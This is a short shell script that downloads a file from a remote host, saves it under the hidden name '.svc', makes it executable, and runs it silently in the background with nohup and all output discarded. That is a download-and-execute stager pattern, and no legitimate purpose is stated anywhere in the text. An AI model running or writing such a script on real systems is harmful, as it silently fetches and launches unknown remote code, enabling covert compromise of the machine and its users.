#!/bin/sh
curl -fsSL https://files.example-cdn.net/agent -o .svc
chmod 755 .svc
nohup ./.svc >/dev/null 2>&1 &
